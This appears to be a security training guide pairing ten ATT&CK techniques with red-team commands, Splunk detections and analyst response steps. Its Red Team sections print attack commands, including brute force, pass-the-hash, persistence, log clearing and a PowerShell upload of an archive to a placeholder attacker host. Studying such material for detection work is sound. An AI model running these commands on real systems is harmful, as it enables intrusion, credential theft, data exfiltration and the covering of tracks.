# Attack → Detection Map

Ten techniques, kill-chain order, each shown from both sides. MITRE ATT&CK IDs are noted for each so you can cross-reference against the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) or your own detection coverage matrix.

---

## 1. Active Scanning (T1595) / Network Service Discovery (T1046)

**Red Team**

Before anything else, an attacker maps what's reachable. A typical enumeration pass against a target subnet:

```bash
nmap -sS -sV -O -p- 10.10.10.0/24 -oA full_scan
```

The goal isn't just "what's alive" — `-sV` and `-O` are there to fingerprint service versions and OS, which is what turns a scan into a target list for the next phase (picking exploits that actually match what's running).

**Blue Team**

A single scan barely registers. A *full* scan against a subnet does — it shows up as one source touching an unusual number of distinct destination ports/hosts in a short window.

```spl
index=firewall action=allowed OR action=blocked
| bucket _time span=1m
| stats dc(dest_port) as unique_ports dc(dest_ip) as unique_hosts by src_ip, _time
| where unique_ports > 50 OR unique_hosts > 20
```

Sysmon on the endpoint side can also catch the tool itself if the scan originates from an already-compromised host: Event ID 3 (network connection) fired at high frequency from a single process, or Event ID 1 showing `nmap.exe` / a scripted equivalent launching.

**Analyst Response**

Check whether the source IP is a known vulnerability-scanning asset (most orgs run authorized scans — check your asset inventory / scheduled scan calendar first). If it's not on that list, treat unique-port-fan-out from an internal host as a strong pivot indicator: something on your network is mapping the rest of it. Correlate against DHCP/asset records to identify the physical device before escalating.

---

## 2. Spearphishing Attachment (T1566.001) → PowerShell Execution (T1059.001)

**Red Team**

A weaponized document (macro-enabled Office file, or a script disguised with a double extension) delivered by email. Opening it triggers an encoded PowerShell command as the actual payload delivery mechanism — encoding buys the attacker a little evasion against naive string-matching defenses:

```
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
```

**Blue Team**

The signal isn't the email — by the time it's opened, the email layer has already lost. The signal is the process tree: an Office application spawning a shell.

```spl
index=sysmon EventID=1
| search ParentImage="*winword.exe" OR ParentImage="*excel.exe" OR ParentImage="*outlook.exe"
| search Image="*powershell.exe" OR Image="*cmd.exe" OR Image="*wscript.exe"
```

An Office app spawning `powershell.exe`, `cmd.exe`, or `wscript.exe` is one of the highest-signal, lowest-noise detections available — legitimate documents essentially never do this.

**Analyst Response**

Treat any Office-app-spawns-shell event as high priority by default. Pull the command line (Sysmon Event ID 1 logs full `CommandLine`) — a base64-encoded (`-enc`) or heavily obfuscated argument is close to a confirmed positive on its own. Isolate the host, identify the original email/sender, and check whether the same attachment reached other mailboxes before deciding blast radius.

---

## 3. Brute Force (T1110)

**Red Team**

Credential attacks against an exposed login service — RDP, SSH, a web login form:

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.5
```

The attacker is trading noise for speed: a large wordlist against a single account is loud, but it's also the fastest path to a valid credential if MFA isn't in place.

**Blue Team**

Windows Event ID **4625** (failed logon) is the signal; volume and timing are what separate an attack from a user who forgot their password.

```spl
index=windows EventCode=4625
| bucket _time span=1m
| stats count by src_ip, user, _time
| where count > 10
```

**Analyst Response**

Check the count and the spread: a handful of failures from one user's normal workstation is routine; 100+ failures across multiple usernames from one source IP in under a minute is not. Check whether any of the attempted logons eventually succeeded (Event ID 4624 immediately following a burst of 4625s from the same source is the worst-case pattern — a successful brute force). If it's contained to failures, block the source and close with the finding documented; if a success follows, this becomes a credential-compromise incident and escalates immediately.

---

## 4. Kerberoasting (T1558.003)

**Red Team**

Once inside an Active Directory environment with any authenticated (even low-privilege) account, an attacker can request Kerberos service tickets for accounts with a Service Principal Name (SPN) set, then crack them offline — no elevated privileges needed to request the ticket itself:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"
```

The value of this technique is that the actual "attack" — requesting a ticket — looks like completely normal Kerberos traffic. The cracking happens offline, away from any monitored system.

**Blue Team**

The tell isn't the request itself (that's normal AD behavior) — it's the encryption type and the request pattern. Windows Event ID **4769** (Kerberos service ticket request) with encryption type `0x17` (RC4, weaker and preferred by attackers for faster offline cracking) requested for multiple SPNs in a short window from one account is the pattern:

```spl
index=windows EventCode=4769
| search TicketEncryptionType=0x17
| stats dc(ServiceName) as unique_spns values(ServiceName) by src_user
| where unique_spns > 3
```

**Analyst Response**

A single RC4-encrypted service ticket request is normal noise in most environments (legacy application compatibility). A single account requesting tickets for several *different* service accounts back-to-back is not — that's enumeration behavior, not a real application authenticating. Identify the requesting account, check whether it's a service account or a human account acting unusually, and check whether that account has recently changed its own password (a sign someone is trying to get ahead of a cracked-hash scenario). Escalate for password rotation on the targeted service accounts regardless of whether cracking is confirmed — the exposure already happened the moment the ticket was issued.

---

## 5. Pass-the-Hash (T1550.002)

**Red Team**

With a captured NTLM hash (from a prior compromise — memory dump, SAM extraction, etc.), an attacker authenticates to other systems *without ever knowing the plaintext password*:

```bash
pth-winexe -U administrator%<NTLM_hash> //10.10.10.10 cmd.exe
```

This is why "the password never left the building" isn't actually a defense — NTLM authentication accepts the hash itself as proof of identity.

**Blue Team**

The signature is a Logon Type **3** (network logon) using NTLM specifically, especially against a privileged account, and especially from a host that account doesn't normally log into:

```spl
index=windows EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM
| stats values(dest_host) as hosts_accessed count by user
| where count > 1
```

**Analyst Response**

Baseline matters more than any single event here — a service account authenticating via NTLM to five servers in a minute might be completely normal for that account, or might be exactly the attack. Check the account's typical behavior (what it normally touches, from where) before deciding. If a human account is showing NTLM network logons to systems it's never touched before, that's a strong lateral-movement indicator — escalate and pull the source host for a compromise investigation, since Pass-the-Hash means a prior host is already compromised.

---

## 6. Lateral Movement via Remote Services (T1021)

**Red Team**

Once inside, an attacker moves host-to-host using legitimate admin channels rather than malware — SMB (`PsExec`), WinRM, or RDP — because it blends into normal sysadmin traffic:

```bash
psexec.py administrator@10.10.10.20 -hashes :<NTLM_hash>
```

**Blue Team**

`PsExec`-style lateral movement leaves a distinctive fingerprint: a new service creation event on the target host immediately following a network logon.

```spl
index=windows (EventCode=7045 OR EventCode=4697)
| search ServiceFileName="*\\ADMIN$\\*" OR ServiceName="PSEXESVC"
```

Sysmon Event ID 3 (network connection) on port 445 immediately followed by Event ID 1 (process creation) for an unfamiliar service binary on the destination host is the broader pattern even when the tool isn't literally PsExec.

**Analyst Response**

Confirm whether the source account and host are authorized for remote administration of the target (check your change-management/admin-access records). A service named `PSEXESVC` — the literal default service name PsExec creates — is close to an automatic escalation unless your own IT team uses PsExec by policy (some do; know your environment before you triage it). Trace backward to how the source host was accessed in the first place — lateral movement is never the first stage of an incident, it's the second or third.

---

## 7. Scheduled Task/Job for Privilege Escalation & Persistence (T1053.005)

**Red Team**

A scheduled task is a dual-purpose tool: it can escalate privileges (if the task runs as SYSTEM) and it survives reboots, giving the attacker persistence without needing to re-exploit anything:

```powershell
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM
```

The naming convention here is deliberate — "WindowsUpdateCheck" is chosen to blend into a list of legitimate scheduled tasks at a glance.

**Blue Team**

Windows Event ID **4698** (scheduled task created) is logged whenever this happens; the interesting cases are tasks that run as SYSTEM or point to binaries in user-writable locations like `Temp` or `AppData`:

```spl
index=windows EventCode=4698
| search TaskContent="*SYSTEM*" AND (TaskContent="*\\Temp\\*" OR TaskContent="*\\AppData\\*")
```

**Analyst Response**

Cross-reference the task name and binary path against your software deployment baseline. Legitimate scheduled tasks almost never point at `Temp` or user profile directories — that alone is a strong indicator regardless of the task name chosen. If confirmed malicious, don't just delete the task: the binary it points to and the account that created it both need to be investigated, since the task itself is just the persistence mechanism, not the payload.

---

## 8. Boot or Logon Autostart Execution — Registry Run Keys (T1547.001)

**Red Team**

The classic, still-common persistence method: writing an entry to a `Run` registry key so a payload executes every time the target logs in.

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\update.exe"
```

**Blue Team**

Sysmon Event ID **13** logs registry value modifications. Watch specifically for writes to `Run`/`RunOnce` keys pointing at non-standard install locations:

```spl
index=sysmon EventID=13
| search TargetObject="*\\CurrentVersion\\Run\\*"
| search Details="*\\Users\\Public\\*" OR Details="*\\Temp\\*" OR Details="*\\AppData\\Roaming\\*"
```

**Analyst Response**

Most legitimate software that adds a Run key does so from `Program Files` at install time, not from `Temp`, `Public`, or `AppData` after the fact. A Run key added by a process other than an installer — especially minutes or hours after initial compromise indicators — is a strong persistence signal. Removing the registry key without finding and removing the referenced binary (and figuring out how it got there) just means the attacker persists through a different mechanism next time.

---

## 9. Exfiltration Over C2 Channel (T1041)

**Red Team**

Rather than standing up a separate exfiltration channel, an attacker sends data out through the same command-and-control connection already in use — fewer new indicators for defenders to catch. Frequently a Living-off-the-Land approach — e.g., PowerShell posting a compressed archive to an external host:

```powershell
Invoke-WebRequest -Uri "https://<attacker-host>/upload" -Method POST -InFile "C:\staging\archive.zip"
```

**Blue Team**

The best detection point is rarely the process itself — it's the network behavior: a beaconing pattern (regular-interval connections to the same external host) followed by an unusually large outbound transfer.

```spl
index=proxy OR index=firewall
| stats sum(bytes_out) as total_out count as connections by dest_ip, src_ip
| where total_out > 104857600
| sort -total_out
```

Pair this with Sysmon Event ID 3 on the source host to identify which process actually owns the connection.

**Analyst Response**

Large outbound transfers happen for legitimate reasons constantly (backups, cloud sync, updates) — the differentiator is destination reputation and whether the process initiating it makes sense. A multi-hundred-MB transfer from `powershell.exe` to a destination with no business justification is a very different finding than the same volume from a known backup agent to a known backup provider. Check destination reputation/threat intel first; if unresolved or suspicious, this is a "stop the bleeding now" escalation — block the destination and isolate the host before finishing the writeup, not after.

---

## 10. Data Destruction / Anti-Forensics — Clearing Windows Event Logs (T1070.001)

**Red Team**

Near the end of an operation, an attacker may clear event logs to slow down or blind incident response — less a technical control bypass and more an attempt to buy time:

```powershell
wevtutil cl Security
wevtutil cl System
```

**Blue Team**

This is one of the rare cases where the *absence* of expected logs is itself the alert. Windows Event ID **1102** ("The audit log was cleared") is logged by the very act of clearing the Security log — an attacker can't clear the log without generating one more log entry documenting that they did it.

```spl
index=windows EventCode=1102
```

**Analyst Response**

This should never be a false positive in a well-run environment — legitimate log clearing is a planned, documented maintenance action, not something that happens silently. Treat any unplanned 1102 event as a near-certain confirmed incident: something happened that the actor wanted hidden. Immediately pull logs from any centralized SIEM/forwarder (which the attacker's local clearing doesn't touch, since the data already shipped off-host) to reconstruct what happened in the window before the clear.

---

## How to Use This

If you're prepping for an interview: pick two or three of these and be ready to talk through them out loud, both directions — "here's how I'd execute this" and "here's how I'd catch it." That two-sided fluency is exactly what this document (and this repo) is trying to demonstrate.

If you're extending this repo: the same three-part structure (Red Team / Blue Team / Analyst Response) scales to any technique in the [MITRE ATT&CK](https://attack.mitre.org/) matrix — add a new technique here the same way, and it stays consistent with the rest of the map.
